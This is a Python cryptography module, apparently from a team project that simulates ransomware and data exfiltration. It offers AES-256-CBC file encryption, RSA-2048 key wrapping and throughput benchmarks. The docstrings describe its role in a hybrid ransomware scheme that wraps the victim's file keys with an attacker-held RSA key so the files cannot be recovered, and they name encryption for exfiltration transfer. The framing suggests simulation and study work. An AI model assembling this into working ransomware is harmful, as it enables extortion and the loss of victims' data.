"""
shared/crypto.py  —  Person 1
Shared cryptography library imported by all other modules.
Contains ONLY pure functions — no script logic, no side-effects on import.

Algorithms
----------
* AES-256-CBC  : bulk encryption for files and exfiltration transfer
* RSA-2048 OAEP: key-wrapping for local ransomware encryption (hybrid scheme)

Dependencies
------------
    pip install cryptography
"""

import os
import json
import time
from pathlib import Path

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.primitives.asymmetric import rsa, padding as asym_padding
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend


# ──────────────────────────────────────────────────────────────────────────────
# Key / IV Generation
# ──────────────────────────────────────────────────────────────────────────────

def generate_aes_key() -> bytes:
    """Return 32 cryptographically random bytes (AES-256 key)."""
    return os.urandom(32)


def generate_iv() -> bytes:
    """Return 16 cryptographically random bytes (AES-CBC IV)."""
    return os.urandom(16)


# ──────────────────────────────────────────────────────────────────────────────
# AES-256-CBC  (byte-level — not extension-dependent)
# ──────────────────────────────────────────────────────────────────────────────

def aes_encrypt(data: bytes, iv: bytes, key: bytes) -> bytes:
    """
    Encrypt *data* with AES-256-CBC using *iv* and *key*.

    Parameters
    ----------
    data : bytes  — plaintext (any binary content)
    iv   : bytes  — 16-byte initialisation vector
    key  : bytes  — 32-byte AES-256 key

    Returns
    -------
    bytes  — PKCS7-padded ciphertext
    """
    padder = sym_padding.PKCS7(128).padder()
    padded = padder.update(data) + padder.finalize()

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(padded) + encryptor.finalize()


def aes_decrypt(data: bytes, iv: bytes, key: bytes) -> bytes:
    """
    Decrypt AES-256-CBC *data* using *iv* and *key*.

    Parameters
    ----------
    data : bytes  — ciphertext produced by :func:`aes_encrypt`
    iv   : bytes  — same 16-byte IV used during encryption
    key  : bytes  — same 32-byte AES-256 key used during encryption

    Returns
    -------
    bytes  — original plaintext with padding stripped
    """
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()
    padded = decryptor.update(data) + decryptor.finalize()

    unpadder = sym_padding.PKCS7(128).unpadder()
    return unpadder.update(padded) + unpadder.finalize()


# ──────────────────────────────────────────────────────────────────────────────
# Convenience: encrypt / decrypt a whole file
# ──────────────────────────────────────────────────────────────────────────────

def encrypt_file(src_path: str, dst_path: str, key: bytes) -> bytes:
    """
    AES-encrypt a file, writing ciphertext to *dst_path*.

    Returns the IV so it can be stored alongside the ciphertext (e.g. in a
    .key sidecar or a transfer header).
    """
    iv = generate_iv()
    with open(src_path, "rb") as fh:
        plaintext = fh.read()
    ciphertext = aes_encrypt(plaintext, iv, key)
    with open(dst_path, "wb") as fh:
        fh.write(ciphertext)
    return iv


def decrypt_file(src_path: str, dst_path: str, iv: bytes, key: bytes) -> None:
    """AES-decrypt *src_path* (ciphertext) → *dst_path* (plaintext)."""
    with open(src_path, "rb") as fh:
        ciphertext = fh.read()
    plaintext = aes_decrypt(ciphertext, iv, key)
    with open(dst_path, "wb") as fh:
        fh.write(plaintext)


# ──────────────────────────────────────────────────────────────────────────────
# RSA-2048 OAEP — Key Wrapping (used by ransomware / local-encryption path)
# ──────────────────────────────────────────────────────────────────────────────

def generate_rsa_keypair(pub_path: str, priv_path: str) -> None:
    """
    Generate an RSA-2048 keypair and write PEM files to *pub_path* / *priv_path*.

    Call once at project setup; commit the public key so Person 3's simulator
    can access it without needing the private key.

    Parameters
    ----------
    pub_path  : str — destination for the public key  (.pem)
    priv_path : str — destination for the private key (.pem)  — keep attacker-side only!
    """
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
        backend=default_backend(),
    )
    public_key = private_key.public_key()

    # Write private key (no passphrase — demo environment)
    Path(priv_path).parent.mkdir(parents=True, exist_ok=True)
    with open(priv_path, "wb") as fh:
        fh.write(
            private_key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption(),
            )
        )

    # Write public key
    Path(pub_path).parent.mkdir(parents=True, exist_ok=True)
    with open(pub_path, "wb") as fh:
        fh.write(
            public_key.public_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PublicFormat.SubjectPublicKeyInfo,
            )
        )


def rsa_wrap_key(aes_key: bytes, pub_key_path: str) -> bytes:
    """
    Wrap (encrypt) an AES session key with the attacker's RSA-2048 public key.

    Used by the ransomware simulator: after encrypting a file with AES, the
    AES key itself is wrapped and written to a .key sidecar file. Without the
    RSA private key (held only by the attacker), the victim cannot recover the
    AES key and therefore cannot decrypt their files.

    Parameters
    ----------
    aes_key      : bytes — 32-byte AES key to wrap
    pub_key_path : str   — path to attacker's RSA public key (.pem)

    Returns
    -------
    bytes — RSA-OAEP ciphertext of the AES key
    """
    with open(pub_key_path, "rb") as fh:
        public_key = serialization.load_pem_public_key(fh.read(), backend=default_backend())

    return public_key.encrypt(
        aes_key,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )


def rsa_unwrap_key(wrapped_key: bytes, priv_key_path: str) -> bytes:
    """
    Unwrap (decrypt) a wrapped AES key using the attacker's RSA-2048 private key.

    Parameters
    ----------
    wrapped_key   : bytes — ciphertext produced by :func:`rsa_wrap_key`
    priv_key_path : str   — path to attacker's RSA private key (.pem)

    Returns
    -------
    bytes — the original 32-byte AES key
    """
    with open(priv_key_path, "rb") as fh:
        private_key = serialization.load_pem_private_key(
            fh.read(), password=None, backend=default_backend()
        )

    return private_key.decrypt(
        wrapped_key,
        asym_padding.OAEP(
            mgf=asym_padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )


# ──────────────────────────────────────────────────────────────────────────────
# Benchmarking helpers (Person 1 requirement: save results/crypto_benchmarks.json)
# ──────────────────────────────────────────────────────────────────────────────

def benchmark_aes(sample_files: dict[str, str], key: bytes | None = None) -> dict:
    """
    Measure AES encrypt + decrypt throughput for a set of sample files.

    Parameters
    ----------
    sample_files : dict[str, str]
        Mapping of media-type label → file path.
        Example: {"text": "/tmp/sample.txt", "image": "/tmp/sample.jpg", ...}
    key : bytes, optional
        AES-256 key to use. A fresh key is generated if not supplied.

    Returns
    -------
    dict
        {
          "<label>": {
            "size_bytes": int,
            "encrypt_ms": float,
            "decrypt_ms": float,
            "encrypt_throughput_mbps": float,
            "decrypt_throughput_mbps": float,
          },
          ...
        }
    """
    if key is None:
        key = generate_aes_key()

    results = {}
    for label, path in sample_files.items():
        with open(path, "rb") as fh:
            data = fh.read()
        size = len(data)
        iv = generate_iv()

        t0 = time.perf_counter()
        ciphertext = aes_encrypt(data, iv, key)
        enc_ms = (time.perf_counter() - t0) * 1000

        t0 = time.perf_counter()
        aes_decrypt(ciphertext, iv, key)
        dec_ms = (time.perf_counter() - t0) * 1000

        results[label] = {
            "size_bytes": size,
            "encrypt_ms": round(enc_ms, 4),
            "decrypt_ms": round(dec_ms, 4),
            "encrypt_throughput_mbps": round((size / 1e6) / (enc_ms / 1000), 4) if enc_ms > 0 else None,
            "decrypt_throughput_mbps": round((size / 1e6) / (dec_ms / 1000), 4) if dec_ms > 0 else None,
        }
    return results


def benchmark_rsa(pub_key_path: str, priv_key_path: str) -> dict:
    """
    Measure RSA key-wrap and unwrap overhead.

    Returns
    -------
    dict with wrap_ms and unwrap_ms averages over 10 iterations.
    """
    aes_key = generate_aes_key()
    wrap_times, unwrap_times = [], []

    for _ in range(10):
        t0 = time.perf_counter()
        wrapped = rsa_wrap_key(aes_key, pub_key_path)
        wrap_times.append((time.perf_counter() - t0) * 1000)

        t0 = time.perf_counter()
        rsa_unwrap_key(wrapped, priv_key_path)
        unwrap_times.append((time.perf_counter() - t0) * 1000)

    return {
        "rsa_wrap_avg_ms": round(sum(wrap_times) / len(wrap_times), 4),
        "rsa_unwrap_avg_ms": round(sum(unwrap_times) / len(unwrap_times), 4),
        "iterations": 10,
    }


def save_benchmarks(results: dict, output_path: str) -> None:
    """Write benchmark results to a JSON file, creating parent dirs as needed."""
    Path(output_path).parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w") as fh:
        json.dump(results, fh, indent=2)
    print(f"[crypto] Benchmarks saved → {output_path}")
